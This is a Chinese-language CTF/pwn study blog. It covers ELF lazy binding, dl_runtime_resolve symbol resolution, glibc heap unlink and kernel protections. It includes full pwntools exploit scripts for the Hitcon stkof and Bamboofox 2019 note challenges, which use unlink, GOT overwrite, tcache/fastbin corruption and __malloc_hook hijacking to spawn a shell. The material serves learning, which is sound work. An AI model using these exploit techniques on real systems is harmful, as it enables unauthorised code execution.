

# LiEn's blog  

**記錄一些pwn的技巧以及一些題目的解法，內容如果有錯麻煩告知會盡快修改XD。**


**近期剛push上來版面排版很差XD，希望不要嫌棄**

---

* This will become a table of contents (this text will be scrapped).
{:toc}

---

### ret2_dl_runtime:

- **大部分內容都是從ntu的stcs的week8來的** 看過後自己實作跟追蹤一次


需要對lazy binding 差不多熟悉, 以及會需要elf檔案的一些background
將一些library解析symbol的方式記錄起來


* lazy-binding & elf參考資料
  * [layz-binding](http://wthung2.blogspot.com/2010/03/elf-lazy-binding.html)
  * [glibc/elf/elf.h](https://code.woboq.org/userspace/glibc/elf/elf.h.html)

---

#### Lazy binding : 
    - dynamic link 時可能一些函式在library的函式在程式結束時可能都沒執行到。
    - 所以只有在call 到函式的時候才去解析函式位置，才會去尋找library函式中真正的位置。

---

- GOT (Global Offset Table) : 
    - 為一個全域變數的array
    - 存放library 函式的offset
    - 一開始只填plt的jump code
    
---

- PLT (Procedure Linkage Table) : 
    - call _dl_resolver()去解析函式真正位置
    - 把解析出來位置填回GOT

---

- GOT : 0x601020
- PLT : 0x400476
- ![](https://i.imgur.com/VaDmv1Y.png)

---

- 剛進去的時候
 - 進去read的時候:
 - ![](https://i.imgur.com/hs5bTAa.png)


---

- JUMP回去
 - JUMP 回去push offset 的地方
 - ![](https://i.imgur.com/VENtILu.png)

---

- 找實際位置
 - 去找目標函式的位址並填到 GOT (0x601020) 然後跳過去執行
 - ![](https://i.imgur.com/UP3avDS.png)


---

- push link_map structure 
 - ![](https://i.imgur.com/ML4xkHx.png)
 - ![](https://i.imgur.com/nJUID93.png)

---

- 跳去resolver 
 - ![](https://i.imgur.com/xKkzwDT.png)
 - ![](https://i.imgur.com/pghlEVc.png)

---

- 解好之前 GOT
 - ![](https://i.imgur.com/J0fBPkv.png)

---

- 解完後 GOT
 - ![](https://i.imgur.com/AgMveYx.png)

---
#### Source code 追追追
--- 
* section & segment
  *   section : 檔案存放code或者data的連續記憶體區段
  *    .bss .text .data .got .....
  *    objdump -j (section name) .got.plt -s (hex) ./binary
  *    readelf -a \| less 
  
* segment : 由多個sections組合成一個

![](https://i.imgur.com/PdPn1PU.png)

* 可以用(gdb)x/s 0x400000 (program base) : "\177ELF\002\001\001"看magic string
* 程式執行時section header不存在 所以以program header為主。
* Program Header table 為 Elf64_Phdr 的陣列。
 * 指定檔案中內容和在記憶體的位置,以及segment會被map到哪裡（p_paddr) ,segments size (p_memsz) 等等。
 * 由上圖知道program header entry = 0x400000 + 64 (0x40)
 * p/x *(Elf64_Phdr *)0x400040
 * source code struct :
   ![](https://i.imgur.com/hY0MUCe.png)

---

對比一下source code

![](https://i.imgur.com/YfDGpcD.png)
* 由ELF Header那張圖可以看到Number of program headers 有9個而這個可以當
array來印或是可以直接＠9就會直接印出九個program headers的內容。

* dynamic section 
 * 解析symbol重要的section
 * 沒有section header table ,但可以從program header table 找到
 * 找出 p_type 值為 PT_DYNAMIC 的 program header
 * Base + p_offset = .dynamic

---
* 可以看到 PT_DYNAMIC 的 p_type 值為2
    ![](https://i.imgur.com/ipVABp8.png)
    
    ---
    
    * 所以可以印出來檢查

    ![](https://i.imgur.com/tTCSV4B.png)
   
    ---
    * 去比對一下用readelf抓出來的
    
    ![](https://i.imgur.com/3rdnlJ0.png)
    ---
    
    * 是Elf64_Dyn 的陣列。 
    ![](https://i.imgur.com/pFGVy7P.png)
    
* Dynamic Entry
    
    * 用 d_val 或是 d_ptr 取決於 d_tag (DT_?????)
    * ![](https://i.imgur.com/TlHmUR8.png)
    
* .dynstr section 
    * d_tag 為 DT_STRTAB(5)
    * 為 .dynsym 中 st_name 對應的 string table 
    * sym_name = (char*)(.dynstr + st_name)
    * st_name 為 Elf64_Sym 中的 string table index


* .dynsym section 
    * 在.dynamic d_tag 為 DT_SYMTAB(6)
    * d_ptr 指向 .dynsym section 。
    * st_name 指向 symbol name string 。

    ![](https://i.imgur.com/F8fb76w.png)
    
    ![](https://i.imgur.com/Bj9ATZ0.png)
    
    * 所以根據上圖可以知道dynsym ,跟 dynstr 
      用gdb記錄一下：
      set $dynsym = (Elf64_Dyn*)0x4002d0
      set $dynstr = (char*)0x400330
    
* .rel.plt
    * d_tag 為DT_JMPREL (7), struct 為 Elf64_Rel(debug mode: Ellf64_Rela)
    * r_offset 為got要填的地方。
    * r_info 中包含 symbol index 。
        * Elf64_R_SYM 取高32bit ,Elf32_R_SYM 取高24bit
        * Symbol index 為 .dynsym 中的index。
            * 所以 $dynstr + $dynsym[index]-> st_name 可以拿到symbol。
            
* 解析GOT上的functions
    * GOT entry 原本的值是.plt entry 中的第二條指令(Ex:push 0x4) push reloc_arg(.rel.plt 中的offset)ㄝ,在rela時候為index.之後跳到.plt中的第一行（PLT0)-> plt section 開頭。
    
    * puts_plt 會先嘗試跳GOT(可是第一次function還沒resolve所以直接跳push 0x0 (index)),之後就跳PLT0（可看addr) jmp 0x400400。
    ![](https://i.imgur.com/1LiFuXt.png)
    
    * 下圖為PLT0
    ![](https://i.imgur.com/Sug3Dao.png)

    * PLT0 (.got.plt x/3gx)
        * push (GOT1) (struct link_map*) pointer
        * jump (GOT2) 跳到 dynamic resolver 開找symbol。
        * 圖中：0x601000 的位置為GOT0 裡面放index(or offset)
        * 圖中：0x601008 的位置為GOT1 裡面放(struct link_map)
        * 圖中：0x601000 的位置為GOT2 裡面放_dl_runtime_resolve()
    ![](https://i.imgur.com/WaF5HaD.png)


* Dynamic Resolver 
    * source : glibc/elf/dl_runtime.c
    * 要link_map , reloc_arg 當參數
    * struct link_map 裡面其實就存了所有已載入的ELF資訊
    * 取symbol name 去library 找到後填回GOT. (0x6010xx)

* Workflow
    可以看到dynstr 裡面就是string table 所以+ st_name (index) 就可以拿到symbol。
    
    * ![](https://i.imgur.com/ySLt7f6.png)

    * ![](https://i.imgur.com/HcMn0JE.png)


```
_dl_runtime_resolve(link_map,reloc_arg)
     ------------               ｜
     |Elf64_Rela|   <-----------｜
 --- |----------|      
 |   |r_offset  |
 |   |r_info    |  --------->  --------------
 |   ------------              |Elf64_Sym   |  --->  find the symbol ! 
 v                             --------------         --------------
--------                       |st_name     |         |printf\0    |
|printf|                       --------------         --------------
--------
.got.plt
```

- link_map gogo

---

* link_map struct : 
    * [glibc/include/link.h](https://code.woboq.org/userspace/glibc/include/link.h.html)
    * l_next linked list 串接下一個以載入的library
    * l_name library name
    * l_addr library base addr
    * l_info[index] 指向 .dynamic 中, d_tag = index 的欄位
        * 可以拿到 library 各個section 也就是拿.dynsym就可以解symbol.....


* gdb link_map trace 
    * set $l = (struct link_map *)link_map_addr
    * set $l2 = $l -> l_next -> l_next (libc)
    * set $dynstr2 = (char *) addr (可以用 (gdb) p * $l2->l_info[5] (d_tag=5))
    * set $dynsym = (Elf64_Sym*)addr(同上 只是d_tag改為6)
    * 手解symbol: dynstr + dynsym[index] ->st_name 可以找到function 
        * 這裡可以用python script 去找symbol: 
        * ```python
            for i in range(1000):
                x = gdb.execute('p/s $dynstr2 + $dynsym2[%d] -> st_name ' %i , True ,True)
                if 'printf' in x:
                    print (i,x)
            end
            ```
    * 找到printf為 603 所以可以知道printf的symbol

    ![](https://i.imgur.com/36qUwh9.png)

    * ptype $dynsym2 可以拿到struct
    * 所以可以 p/x $dynsym2[603]拿到以下結構 value為offset。所以加上
    libc_base ( $ l2 -> l_addr ) 可以拿到libc中printf的位置。


    * x/s $l2-> l_addr + $dynsym2[603]-> st_value
    ![](https://i.imgur.com/QR55xUJ.png)

---
  
####  Symbol Resolution 
* dl_runtime_resolve -> _dl_fixup(link_map,reloc_arg)
* 可以直接掃整個 .dynsym 去檢查st_name 找需要的symbol
* 但是太花時間所以使用一個小小的 GNU Hash table 
```C
uint32_t_dl_new_hash(const char*s){
    uint32_t h = 5381;
    for(unsigned char c = *s ; c!='\0'; c= *++s)
        h = h*33 +c
    return h ;
}
```
python version : 
![](https://i.imgur.com/oZSxLPI.png)

* 查找hash table 
    * int b = l_gnu_buckets[hash % l_nbuckets]
    * i = b 開始檢查
        * ((l_gnu_chain_zero[i] ^ hash) >> 1) == 0
        * 直到(l_gnu_chain_zero[i] & 1 )!=0
            * 若相等 , sym = .dynsym[i] 就是第i個 Elf64_Sym
            * 再檢查 sym -> st_name 是否相等,避免collison
    * sym -> st_value + l_addr 就是 function 在libc中的實際位置。
    
    ****
     找 l_nbuckets :  
    ![](https://i.imgur.com/jf4kmHl.png)

    找int b = l_gnu_buckets[hash % l_nbuckets]
    不管64bit 還是32bit 都是word長度
    b = 0x25a
    ![](https://i.imgur.com/RPa7SH8.png)
    
    讓i=b(0x25a)開始找 可以看到當index為0x25b時會符合條件
    所以 sym = dynsym[0x25b]
    ![](https://i.imgur.com/pV3yklU.png)
    
    如圖 成功拿到printf 的symbol
    ![](https://i.imgur.com/rWqYRaB.png)

    

---
### IO_FILE_structure:

---

- stdin,stdot,stderr
- ![](https://i.imgur.com/2Y8Pcth.png)


---

- _IO_FILE_plus
- ![](https://i.imgur.com/w9xE6zs.png)


---

- FILE_structure 
- ![](https://i.imgur.com/XBDBk3K.png)

---

- vtable
- ![](https://i.imgur.com/XaJJNIV.png)


---

- vtable 
- ![](https://i.imgur.com/kMCCtyI.png)


---

## heap:
---
### unlink:
* glibc2.23以後有加check。
* library source code : 
    
![](https://i.imgur.com/MWBvsHb.png)
* 會先看size是否為small bin size 
* 檢查prev_size 跟自己size是否相符 否:corrupted size vs prev_size
* unlink 觸發在free的時候前後可以merge
* 會檢查 fd->bk != p , bk->fd != p 分別是不是要unlink的chunk
    之後就double linked link 裡面就會unlink
* merge:
    * ![](https://i.imgur.com/CGrrpEL.png)

---

以Hitcon 的stkof來熟悉unlink
* 這題會把malloc 的pointer 儲存到global array(並且index從1開始)
* 存在heap overflow 可以改到下面(fd,bk)
* small bin size(free的)
* 偽造出要unlinked的chunk
    
因為這題沒有setvbuf來作緩衝所以第一次io(fgets)時會malloc出1024的size,所以可以先allcoate一塊去把它切開。

重點主要在偽造free chunk 要滿足unlink的constrain。
* 在allocate切完後緊接allocate(0x30),(0x80 small bin size 要free的)
* 在0x30 ~ 0x80 之間作偽造freechunk
 ![](https://i.imgur.com/IcZOuVL.png)
---
   * 滿足chunksize = prev_size(next_chunk) memory layout
        * |00000000 00000040|
        * |00000000 00000020| -> 偽造的size(這裡的inuse bit不重要)且是global[2]
        * |0x602138 0x602140| -> 目標的fd,bk(過檢查)
        * |00000020 0xpadddd|  ->滿足size的檢查
        * |00000030 00000090| -> 偽造prev_size跟inuse bit為0x90(原本0x91)
* 滿足 FD->bk = p , BK->fd = p 這邊需注意(FD = p->fd , BK = p->bk)位置
![](https://i.imgur.com/cg2CM2k.png)
以圖來說0x1350540是fake chunk偽造的地方 , 0x602150是&fake_chunk
也就是p,所以FD = p -> fd && FD->bk=p 時代表:0x602150需要去減0x18這樣FD->bk才會是p(64bits data structure),相對的Bk->fd=p則需減去0x10。
    * 偽造的fd = 0x602138 = 0x602150(&fake_chunk)-0x18
    * 偽造的bk = 0x602140 = 0x602150(&fake_chunk)-0x10

---

* 解題:
    * 漏洞:
        * edit的地方fread存在heapoverflow。
        * ![](https://i.imgur.com/GVxhgWP.png)

    * 流程:
        * 偽造free chunk(payload1)
        * unlinked 過基本上在0x602138那邊透過edit()可以任意寫
        * 把0x602148那邊先改free_got,puts_got,atoi_got(payload2)
        * leak只要把free_got改成puts_plt就可以用puts(puts_got)來leak
        * 算出libc_base後把atoi_got改system之後input /bin/sh就拿shell了
      
---

Hitcon_stkof exp:

```python
#!/usr/bin/env python2
#-*-coding:utf-8 -*-
from pwn import *
context.terminal =  ['tmux','split','-h']
#context.log_level = 'debug'
p = process('./stkof')
binary = ELF('./stkof')
libc = ELF('./libc.so.6')

head = 0x602140

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx,cont):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(len(cont)))
    p.send(cont)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))

payload1 = ""
payload1 += p64(0)
payload1 += p64(0x20)
payload1 += p64(head+0x10-0x18)
payload1 += p64(head+0x10-0x10)
payload1 += p64(0x20)
payload1 += "D"*8
payload1 += p64(0x30)
payload1 += p64(0x90)

alloc(0x100)#1
alloc(0x30) #2
alloc(0x80) #3
edit(2,payload1)
#gdb.attach(proc.pidof(p)[0])
# unlink
free(3)
p.recvuntil('OK\n')
#gdb.attach(proc.pidof(p)[0])
payload2 = ""
payload2 += "deadbeef"
payload2 += p64(binary.got['free'])
payload2 += p64(binary.got['puts'])
payload2 += p64(binary.got['atoi'])
edit(2,payload2)
#gdb.attach(proc.pidof(p)[0])
#leak : use puts_plt(puts_got)
puts_plt = binary.plt['puts']
edit(0,p64(puts_plt))
free(1)
leak = u64(p.recv(6).ljust(8,'\x00'))
log.success('libc+puts_address : ' + hex(leak))
libc_base = leak - libc.symbols['puts']
log.success('libc_base : ' + hex(libc_base))
#gdb.attach(proc.pidof(p)[0])
system = libc_base + libc.symbols['system']
edit(2,p64(system))
p.sendline('/bin/sh\x00')

p.interactive()
```



### uaf:

### double free:

### tcache:

### house_of_orange:

---
## kernel:

### basic knowledge

kernel mode : 
![](https://i.imgur.com/7WTV6kA.png)


* 如何進入kernel mode :
    * int 0x80 , syscall , ioctl
    * 系統異常
    * 外部設備中斷
* kernal 保護機制 : 
    * KPTI : Kernel PageTable isolation
    * KASLR : Kernel aslr 
    * SMEP : Supervisor Mode Execution Prevention
    * SMAP : Supervisor Mode Asscess Prevention
    * Stack protector : Canary
    * kptr_restrict : 允許查看kernel functions address
    * dmesg_restrict : 允許使用printk查看輸出
    * MMAP_MIN_ADDR : 不允許申請NULL(大小的memory)

---

#### ret2user

---

* 中國比賽的題目連結: https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar
* 環境安裝 : https://eternalsakura13.com/2018/03/31/b_core/
* writeup : https://www.anquanke.com/post/id/172216

---

cpio解壓縮打包


* 解壓縮流程
    * 隨便創一個資料夾
    * 把core.cpio 丟過去
    * core.cpio 解壓縮要先把名子改成 core.cpio.gz -> gunzip core.cpio.gz
    * cpio -idmv < NAME.cpio
    * 把裡面的NAME.cpio刪掉
    * 整個解壓縮後可以去init初始化的檔案中更改一些東西
* 打包
    * 用解壓縮後裡面有的shell script 去包回去(expliot也是這樣包回去)
    ```sh
    find . -print0 \
    | cpio --null -ov --format=newc \
    | gzip -9 > $1
    ```
    
    
    
## Binary write up:

### Bamboofox 2019 note:
* Heap exploitation 的相關題目,在剛學heap exp的時候來解發現完全不會且漏洞的地方都沒找到。
在只學了fastbin corruption 的attack是完全不夠解的且在glibc-2.26之後有tcache的機制所以又稍微不太一樣了。
* 漏洞：
    * 這題的漏洞是在比賽結束後看writeup看了好一陣子才理解的漏洞。
    成因在snprintf()這個function也就是位於menu()的copy()。
    * snprintf 的 return value 是print的大小而不是寫入字串的大小,
    由整個函數來看： int snprintf(char *str, size_t size, const char * restrict format, ...)
    可以限制函數的size來阻擋在stack 或heap overflow的問題但是如果拿ret value 來當作大小的話則會存在overflow !。

---
Poc: 

```c
#include <stdio.h>
#include <stdlib.h>
int main(){
   char str1[10];
   int ret_val ;
   ret_val = snprintf(str1,9,"AAAABBBBCCCC");
   printf("ret_val => %d\n",ret_val);
   return 0 ;
}
```

./poc 
et_val => 12

           
           
---
   
* 本題分析：
``` 
    透過ida的Pseudocode可以看到 
    *((char**)&note+3*v4) : des idx 
    *((_QWORD*)&unk_202068+3*v4) : (des) size
    *((_QWORD*)&note+3*v3) : source idx
    
    如果大小source idx 裡面字串長度大於des idx 的size
    的時候return value 會是source idx 裡面的字串長度,
    所以只要先edit 一段夠長的string到source idx 裡面,
    透過copy()就可以把size改掉並造成overflow。
``` 
![](https://i.imgur.com/LO6OPTr.png)

* 利用：
    * 參考官方解法：
        * 因為有tcache所以先for迴圈把tcahe灌滿7個之後才能用到fastbin 
        * 透過copy()函數去leak libc 
        * 去改__malloc_hook -> one_gadget
        * get shell 

---
Exp: 

```python
from pwn import *
import sys
if len(sys.argv) >1:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process('./note')

def create(size):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(size))

def edit(idx, ctx):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(idx))
    r.sendafter(':', ctx)

def show(idx):
    r.sendlineafter(':', '3')
    r.sendlineafter(':', str(idx))

def copy(src,dst):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', str(src))
    r.sendlineafter(':', str(dst))

def delete(idx):
    r.sendlineafter(':', '5')
    r.sendlineafter(':', str(idx))

#fill tcache
for i in range(7):
    create(0x60)
    delete(0)
#fill tcahce 
for i in range(7):
    create(0x400)
    delete(0)

create(0x80) #0
create(0x400)#1
create(0x80) #2
create(0x400)#3
create(0x80) #4
create(0x60) #5
create(0x60) #6
create(0x80) #7
delete(1)

#preset copy
edit(3, 'A'*0x100 + '\n')
#use copy to get 0x101 ret
copy(3, 0)
#leak
show(0)

r.recvn(0x91)
libc = u64(r.recvn(8)) - 0x3ebca0
print('libc', hex(libc))
#fastbin
delete(6)
delete(5)

copy(3, 4)
#find near malloc_hook place for size 0x70
edit(3, 'A'*0x90 + p64(libc+0x3ebc30-0x28+5))
copy(3, 4)

#set the fake chunk size 
for i in range(6,-1, -1):
    edit(3, 'A'*(0x88+i) + p64(0x71) )
    copy(3, 4)
#get fastbin 
create(0x60)
create(0x60)

one_gadget = libc+0x4f322
#write one_gadget 
edit(5, 'A'*0x13 + p64(one_gadget))
delete(0)
create(0)

r.interactive()

```
    

